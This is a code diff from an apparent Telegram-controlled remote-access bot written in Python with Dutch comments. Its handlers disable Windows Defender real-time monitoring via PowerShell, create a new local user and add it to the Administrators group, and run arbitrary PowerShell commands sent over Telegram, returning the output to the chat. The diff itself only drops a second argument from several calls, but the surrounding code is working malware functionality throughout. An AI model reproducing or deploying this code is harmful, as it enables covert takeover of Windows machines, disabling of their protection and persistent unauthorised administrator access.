@@ -86,7 +86,7 @@ async def stopDefender_command(update: Update, context: ContextTypes.DEFAULT_TYP
     - run een command om te controleren als windows defender uit of aan staat
     - return de powershell output om te zien als de command wel of niet was uitgevoerd
     """
-    run_powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true', True)
+    run_powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true')
     # meld dat Windows defender uit is
     commandOutput = run_powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
     await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
@@ -109,7 +109,7 @@ async def newuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         New-LocalUser -Name "{context.args[0]}" -Password $Password;
         Add-LocalGroupMember -Group "Administrators" -Member "{context.args[0]}";
         '''
-        run_powershell_command(add_new_user, True)
+        run_powershell_command(add_new_user)
         
         commandOutput = run_powershell_command('Get-LocalGroupMember -Group "Administrators"')
         await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
@@ -148,7 +148,7 @@ async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 get_adminRights()
                 return
 
-            commandOutput = run_powershell_command(args[1], True)
+            commandOutput = run_powershell_command(args[1])
             await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
 
     except ValueError:
